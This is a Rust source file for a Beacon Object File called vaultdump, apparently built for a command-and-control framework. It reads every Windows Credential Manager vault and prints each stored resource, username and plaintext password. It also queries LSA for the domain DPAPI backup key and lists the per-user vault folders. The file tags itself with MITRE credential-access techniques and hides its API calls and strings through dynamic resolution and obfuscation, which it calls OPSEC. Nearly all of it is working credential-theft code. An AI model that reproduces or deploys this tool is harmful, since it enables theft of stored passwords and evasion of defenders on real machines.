// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//! vaultdump — Windows Vault credential dump via vaultcli.dll.
//! Ported from MeirV2-2/VaultDumpBOF. OPSEC: all API via dfr_fn!.
//!
//! MITRE: T1555.004 (Credentials from Password Stores: Windows Credential Manager)
#![no_std]
#![cfg_attr(not(test), no_main)]

use core::ptr::null_mut;
use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555.004", name: "Windows Credential Manager", tactic: "Credential Access" },
    Technique { id: "T1003.004", name: "LSA Secrets", tactic: "Credential Access" },
];

// --- Constants ---
const INVALID_HANDLE_VALUE: *mut u8 = -1isize as *mut u8;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x10;
const INVALID_FILE_ATTRIBUTES: u32 = 0xFFFFFFFF;
const LOGON32_LOGON_INTERACTIVE: u32 = 2;
const POLICY_GET_PRIVATE_INFORMATION: u32 = 0x4;

// --- Structures ---
#[repr(C)]
struct Guid { data1: u32, data2: u16, data3: u16, data4: [u8; 8] }

#[repr(C)]
struct VaultItemData {
    schema_element_id: u32, _unk0: u32, item_type: u32, _unk1: u32,
    data_ptr: *mut u16, // union: String (PWSTR) or Blob
}

#[repr(C)]
struct VaultItem {
    schema_id: Guid,
    friendly_name: *mut u16,
    resource: *mut VaultItemData,
    identity: *mut VaultItemData,
    authenticator: *mut VaultItemData,
    package: *mut VaultItemData,
    _last_written: [u8; 8],
    _flags: u32,
    _props_count: u32,
    _props: *mut VaultItemData,
}

#[repr(C)]
struct Win32FindDataW {
    dw_file_attributes: u32,
    _ft_creation: [u8; 8],
    _ft_access: [u8; 8],
    _ft_write: [u8; 8],
    _n_file_size_high: u32,
    _n_file_size_low: u32,
    _reserved: [u32; 2],
    c_file_name: [u16; 260],
    _c_alt: [u16; 14],
}

#[repr(C)]
struct LsaUnicodeString { length: u16, max_length: u16, buffer: *mut u16 }

#[repr(C)]
struct LsaObjectAttributes { length: u32, _pad: [u8; 20] }

// --- DFR functions ---
dfr_fn!(load_library_a(name: *const u8) -> *mut u8,
    module = "kernel32.dll", api = "LoadLibraryA");

dfr_fn!(vault_enumerate_vaults(flags: u32, count: *mut u32, guids: *mut *mut Guid) -> u32,
    module = "vaultcli.dll", api = "VaultEnumerateVaults");

dfr_fn!(vault_open_vault(guid: *mut Guid, flags: u32, handle: *mut *mut u8) -> u32,
    module = "vaultcli.dll", api = "VaultOpenVault");

dfr_fn!(vault_enumerate_items(vault: *mut u8, flags: u32, count: *mut u32, items: *mut *mut u8) -> u32,
    module = "vaultcli.dll", api = "VaultEnumerateItems");

dfr_fn!(vault_get_item(
    vault: *mut u8, schema: *mut Guid, resource: *mut VaultItemData,
    identity: *mut VaultItemData, package: *mut VaultItemData,
    hwnd: *mut u8, flags: u32, item: *mut *mut VaultItem
) -> u32, module = "vaultcli.dll", api = "VaultGetItem");

dfr_fn!(vault_free(mem: *mut u8) -> u32,
    module = "vaultcli.dll", api = "VaultFree");

dfr_fn!(vault_close_vault(handle: *mut *mut u8) -> u32,
    module = "vaultcli.dll", api = "VaultCloseVault");

dfr_fn!(logon_user_a(
    user: *const u8, domain: *const u8, pass: *const u8,
    logon_type: u32, provider: u32, token: *mut *mut u8
) -> i32, module = "advapi32.dll", api = "LogonUserA");

dfr_fn!(impersonate_logged_on_user(token: *mut u8) -> i32,
    module = "advapi32.dll", api = "ImpersonateLoggedOnUser");

dfr_fn!(revert_to_self() -> i32,
    module = "advapi32.dll", api = "RevertToSelf");

dfr_fn!(lsa_open_policy(
    system: *mut u8, attrs: *mut LsaObjectAttributes, access: u32, handle: *mut *mut u8
) -> i32, module = "advapi32.dll", api = "LsaOpenPolicy");

dfr_fn!(lsa_retrieve_private_data(
    handle: *mut u8, key: *mut LsaUnicodeString, data: *mut *mut u8
) -> i32, module = "advapi32.dll", api = "LsaRetrievePrivateData");

dfr_fn!(lsa_free_memory(buf: *mut u8) -> i32,
    module = "advapi32.dll", api = "LsaFreeMemory");

dfr_fn!(lsa_close(handle: *mut u8) -> i32,
    module = "advapi32.dll", api = "LsaClose");

dfr_fn!(close_handle(h: *mut u8) -> i32,
    module = "kernel32.dll", api = "CloseHandle");

dfr_fn!(find_first_file_w(path: *const u16, data: *mut Win32FindDataW) -> *mut u8,
    module = "kernel32.dll", api = "FindFirstFileW");

dfr_fn!(find_next_file_w(h: *mut u8, data: *mut Win32FindDataW) -> i32,
    module = "kernel32.dll", api = "FindNextFileW");

dfr_fn!(find_close(h: *mut u8) -> i32,
    module = "kernel32.dll", api = "FindClose");

dfr_fn!(get_file_attributes_w(path: *const u16) -> u32,
    module = "kernel32.dll", api = "GetFileAttributesW");

fn wide_to_str(ptr: *const u16, max: usize) -> &'static str {
    if ptr.is_null() { return "N/A"; }
    // Safety: we only read up to null or max. This is a best-effort display.
    unsafe {
        static mut BUF: [u8; 512] = [0; 512];
        let mut i = 0;
        while i < max && i < 511 {
            let wc = *ptr.add(i);
            if wc == 0 { break; }
            BUF[i] = if wc < 128 { wc as u8 } else { b'?' };
            i += 1;
        }
        BUF[i] = 0;
        core::str::from_utf8_unchecked(&BUF[..i])
    }
}

fn str_to_wide(s: &[u8], buf: &mut [u16]) -> usize {
    let mut i = 0;
    for &b in s {
        if i >= buf.len() - 1 { break; }
        buf[i] = b as u16;
        i += 1;
    }
    buf[i] = 0;
    i
}

unsafe fn dump_vaults() {
    let mut count: u32 = 0;
    let mut guids: *mut Guid = null_mut();

    if vault_enumerate_vaults(0, &mut count, &mut guids).unwrap_or(1) != 0 || guids.is_null() {
        return;
    }

    for i in 0..count as usize {
        let mut h_vault: *mut u8 = null_mut();
        if vault_open_vault(guids.add(i), 0, &mut h_vault).unwrap_or(1) != 0 || h_vault.is_null() {
            continue;
        }

        let mut item_count: u32 = 0;
        let mut items: *mut u8 = null_mut();
        if vault_enumerate_items(h_vault, 0, &mut item_count, &mut items).unwrap_or(1) == 0 && !items.is_null() {
            let vault_items = items as *mut VaultItem;
            for j in 0..item_count as usize {
                let vi = &*vault_items.add(j);
                let mut full_item: *mut VaultItem = null_mut();
                if vault_get_item(
                    h_vault, &vi.schema_id as *const Guid as *mut Guid,
                    vi.resource, vi.identity, vi.package,
                    null_mut(), 0, &mut full_item,
                ).unwrap_or(1) == 0 && !full_item.is_null() {
                    let fi = &*full_item;
                    let res = if !fi.resource.is_null() { wide_to_str((*fi.resource).data_ptr, 256) } else { "N/A" };
                    let ident = if !fi.identity.is_null() { wide_to_str((*fi.identity).data_ptr, 256) } else { "N/A" };
                    let auth = if !fi.authenticator.is_null() { wide_to_str((*fi.authenticator).data_ptr, 256) } else { "N/A" };
                    println!("  [+] Resource: {}", res);
                    println!("      Identity: {}", ident);
                    println!("      Password: {}", auth);
                    println!("");
                    let _ = vault_free(full_item as *mut u8);
                }
            }
            let _ = vault_free(items);
        }
        let _ = vault_close_vault(&mut h_vault);
    }
    let _ = vault_free(guids as *mut u8);
}

unsafe fn check_dpapi_key() {
    let mut attrs: LsaObjectAttributes = core::mem::zeroed();
    attrs.length = core::mem::size_of::<LsaObjectAttributes>() as u32;
    let mut h_policy: *mut u8 = null_mut();

    if lsa_open_policy(null_mut(), &mut attrs, POLICY_GET_PRIVATE_INFORMATION, &mut h_policy).unwrap_or(-1) == 0 {
        // G$DPAPI_MASTERKEY
        let key_name: [u16; 18] = [
            b'G' as u16, b'$' as u16, b'D' as u16, b'P' as u16, b'A' as u16,
            b'P' as u16, b'I' as u16, b'_' as u16, b'M' as u16, b'A' as u16,
            b'S' as u16, b'T' as u16, b'E' as u16, b'R' as u16, b'K' as u16,
            b'E' as u16, b'Y' as u16, 0,
        ];
        let mut secret_name = LsaUnicodeString {
            length: 34, max_length: 36, buffer: key_name.as_ptr() as *mut u16,
        };
        let mut secret_data: *mut u8 = null_mut();
        if lsa_retrieve_private_data(h_policy, &mut secret_name, &mut secret_data).unwrap_or(-1) == 0 && !secret_data.is_null() {
            println!("[!] Domain DPAPI Backup Key found in LSA");
            let _ = lsa_free_memory(secret_data);
        }
        let _ = lsa_close(h_policy);
    }
}

unsafe fn enumerate_user_vaults() {
    obf! { let users_path = r"C:\Users\*"; }
    let mut wide_path = [0u16; 260];
    str_to_wide(users_path.as_bytes(), &mut wide_path);

    let mut fd: Win32FindDataW = core::mem::zeroed();
    let h = find_first_file_w(wide_path.as_ptr(), &mut fd).unwrap_or(INVALID_HANDLE_VALUE);
    if h == INVALID_HANDLE_VALUE { return; }

    loop {
        if fd.dw_file_attributes & FILE_ATTRIBUTE_DIRECTORY != 0 {
            // Skip . and ..
            if fd.c_file_name[0] != b'.' as u16 {
                // Build path: C:\Users\<name>\AppData\Local\Microsoft\Vault
                let mut vault_path = [0u16; 260];
                let mut pos = 0usize;
                obf! { let prefix = r"C:\Users\"; }
                for &b in prefix.as_bytes() { vault_path[pos] = b as u16; pos += 1; }
                for &wc in &fd.c_file_name {
                    if wc == 0 { break; }
                    vault_path[pos] = wc; pos += 1;
                }
                obf! { let suffix = r"\AppData\Local\Microsoft\Vault"; }
                for &b in suffix.as_bytes() { vault_path[pos] = b as u16; pos += 1; }
                vault_path[pos] = 0;

                if get_file_attributes_w(vault_path.as_ptr()).unwrap_or(INVALID_FILE_ATTRIBUTES) != INVALID_FILE_ATTRIBUTES {
                    let name = wide_to_str(fd.c_file_name.as_ptr(), 128);
                    println!("[+] Vault found for: {}", name);
                }
            }
        }
        if find_next_file_w(h, &mut fd).unwrap_or(0) == 0 { break; }
    }
    let _ = find_close(h);
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    if let Err(e) = run() {
        eprintln!("[!] {}", e);
    }
}

fn run() -> Result<(), &'static str> {
    // Load vaultcli.dll
    obf! { let vcli = "vaultcli.dll"; }
    let mut vcli_buf = [0u8; 16];
    vcli_buf[..vcli.len()].copy_from_slice(vcli.as_bytes());
    vcli_buf[vcli.len()] = 0;
    unsafe { let _ = load_library_a(vcli_buf.as_ptr()); }

    // TODO: parse beacon args for optional user/pass/domain for impersonation
    // For now, dump current context
    println!("[*] Dumping Windows Vaults (current context):");
    unsafe { check_dpapi_key(); }
    unsafe { dump_vaults(); }
    println!("[*] Enumerating vault locations:");
    unsafe { enumerate_user_vaults(); }

    Ok(())
}
